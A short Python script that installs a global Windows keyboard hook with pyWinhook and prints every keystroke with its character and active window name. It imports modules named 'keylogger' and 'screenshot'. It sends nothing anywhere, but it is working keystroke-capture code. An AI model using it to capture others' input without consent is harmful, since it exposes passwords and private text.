import keylogger
import screenshot
import pyWinhook as  pyHook
import pythoncom
def onMouseEvent(event):
    print("MessageName:", event.MessageName)
    print("Message:", event.Message)
    print("Time:", event.Time)
    print("Window:", event.Window)
    print("WindowName:", event.WindowName)
    print("Position:", event.Position)
    print("Wheel:", event.Wheel)
    print( "Injected:", event.Injected)
    print("---")
    return True
def onKeyboardEvent(event):
    print( "MessageName:", event.MessageName)
    print( "Message:", event.Message)
    print ("Time:", event.Time)
    print ("Window:", event.Window)
    print( "WindowName:", event.WindowName)
    print( "Ascii:", event.Ascii, chr(event.Ascii))
    print( "Key:", event.Key)
    print( "KeyID:", event.KeyID)
    print( "ScanCode:", event.ScanCode)
    print( "Extended:", event.Extended)
    print( "Injected:", event.Injected)
    print( "Alt", event.Alt)
    print( "Transition", event.Transition)
    print( "---")
    #  The return value of the mouse event listener function
    return True

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = onKeyboardEvent
    hm.HookKeyboard()
#    hm.MouseAll = onMouseEvent
#    hm.HookMouse()
    # Enter the loop, and if you do not close it manually, the program will always be listening
    pythoncom.PumpMessages()

if __name__ == "__main__":
    main()
    print("done.")
